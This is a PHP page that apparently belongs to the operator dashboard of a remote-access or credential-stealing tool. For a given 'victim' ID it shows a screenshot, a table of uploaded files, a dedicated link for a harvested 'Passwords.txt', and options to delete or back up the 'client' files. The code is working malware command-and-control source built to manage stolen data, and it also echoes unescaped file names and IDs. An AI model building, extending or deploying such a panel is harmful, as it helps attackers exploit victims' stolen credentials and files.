<?php
require_once 'session.php';
require_once APP_PATH . 'classes/blackupload/Upload.php';
require_once APP_PATH . 'logic/viewUploadsLogic.php';
?>

<!DOCTYPE html>
<html>

<head>
  <?php require_once 'components/meta.php'; ?>
  <title><?php echo APP_NAME; ?> - View Uploads</title>
  <?php require_once 'components/css.php'; ?>
  <?php $utils->style("vendor/datatables/dataTables.bootstrap4.css"); ?>
</head>

<body id="page-top">
  <?php require_once 'components/header.php'; ?>
  <div id="wrapper">
    <div id="content-wrapper">
      <div class="container-fluid">
        <ol class="breadcrumb">
          <li class="breadcrumb-item">
            <a href="#">Uploads Folder</a>
          </li>
        </ol>
        <form method="POST" action="rmfile.php">
          <?php echo $utils->input("csrf", $utils->sanitize($_SESSION['csrf'])); ?>

          <?php echo $utils->input("vicid", $utils->sanitize($_GET['vicid'])); ?>

          <div class="card mb-3">
            <div class="card-header">
              <i class="fas  fa-upload"></i>
              View Uploads</div>
            <div class="card-body">
              <div class="container text-center">
                <div class="container container-special text-left">
                  <?php if (isset($_GET['msg'])) : ?>
                    <?php if ($_GET['msg'] == "yes") : ?>
                      <?php echo $utils->alert("File has been removed.", "success", "check-circle"); ?>
                    <?php elseif ($_GET['msg'] == "error") : ?>
                      <?php echo $utils->alert("File does not exist !", "danger", "times-circle"); ?>
                    <?php elseif ($_GET['msg'] == "csrf") : ?>
                      <?php echo $utils->alert("CSRF token is invalid.", "danger", "times-circle"); ?>
                    <?php endif; ?>
                  <?php endif; ?>
                </div>

                <?php if (file_exists("upload/$vicID/" . $utils->base64EncodeUrl($vicID) . ".png")) : ?>
                  <a href="<?php echo ("upload/$vicID/" . $utils->base64EncodeUrl($vicID) . ".png"); ?>"><img class="img-fluid rounded border border-secondary" width="60%" height="60%" src="<?php echo ("upload/$vicID/" . $utils->base64EncodeUrl($vicID) . ".png"); ?>"></a>
                <?php else : ?>
                  <img class="img-fluid rounded border border-secondary" src="images/placeholder.jpg" width="60%" height="60%">
                <?php endif; ?>

                <div class="table-responsive pt-4 pb-4">
                  <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                    <thead>
                      <tr>
                        <th>
                          <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="select-all" name="select-all" <?php echo $disabled ?>>
                            <label class="custom-control-label" for="select-all"></label>
                          </div>
                        </th>
                        <th>#</th>
                        <th>File Name</th>
                        <th>File Size</th>
                        <th>File Hash</th>
                        <th>Settings</th>
                      </tr>
                    </thead>
                    <tbody>
                      <?php $i = 1; ?>
                      <?php if (!(empty($files))) : ?>
                        <?php foreach ($files as $file) : ?>
                          <tr>

                            <td>
                              <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="file_<?php echo $i; ?>" name="file[]" value="<?php echo $file; ?>">
                                <label class="custom-control-label" for="file_<?php echo $i; ?>"></label>
                              </div>
                            </td>

                            <td><?php echo $i; ?></td>

                            <td><?php echo $file; ?></td>

                            <td><?php echo $upload->formatBytes(filesize("upload/$vicID/$file")); ?></td>

                            <td><?php echo md5_file("upload/$vicID/$file"); ?></td>
                            <td>
                              <?php if ($file == "Passwords.txt") : ?>
                                <a href="<?php echo SITE_URL . "/viewpasswords.php?vicid={$vicID}"; ?>" class="text-decoration-none"><span class="fas fa-download"></span></a>
                              <?php else : ?>
                                <a href="<?php echo SITE_URL . "/upload/{$vicID}/{$file}"; ?>" class="text-decoration-none"><span class="fas fa-download"></span></a>
                              <?php endif; ?>
                              <a href="<?php echo SITE_URL . "/rmfile.php?fname={$file}&vicid={$vicID}&csrf={$utils->sanitize($_SESSION['csrf'])}"; ?>" class="text-decoration-none">
                                <span class="fas fa-trash-alt"></span>
                              </a>
                            </td>
                          </tr>
                          <?php $i++; ?>
                        <?php endforeach; ?>
                      <?php endif; ?>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
            <div class="card-footer">
              <input type="button" onclick="Backup()" class="btn btn-primary" value="Backup Files">
              <button type="submit" class="btn btn-primary">Delete Files</button>
            </div>
          </div>
        </form>
      </div>
    </div>
  </div>
  <?php require_once 'components/footer.php'; ?>

  <?php require_once 'components/js.php'; ?>

  <?php $utils->script("vendor/datatables/jquery.dataTables.js"); ?>
  <?php $utils->script("vendor/datatables/dataTables.bootstrap4.js"); ?>
  <script>
    $("#dataTable").DataTable({
      ordering: true,
      "language": {
        "emptyTable": "No file available in the folder"
      },
      select: {
        style: "multi",
      },
      order: [
        [1, "asc"]
      ],
      columnDefs: [{
        targets: 0,
        orderable: false,
      }, ],
    });

    $('#select-all').click(function(event) {
      if (this.checked) {
        $(':checkbox').each(function() {
          this.checked = true;
        });

      } else {

        $(':checkbox').each(function() {
          this.checked = false;
        });
      }
    });

    function Backup() {
      var conf = confirm("Backup Clients Files?");
      if (conf == true) {
        window.location.href = 'includes/backupClient.php?vicid=<?php echo $vicID; ?>';
      }
    }
  </script>
</body>

</html>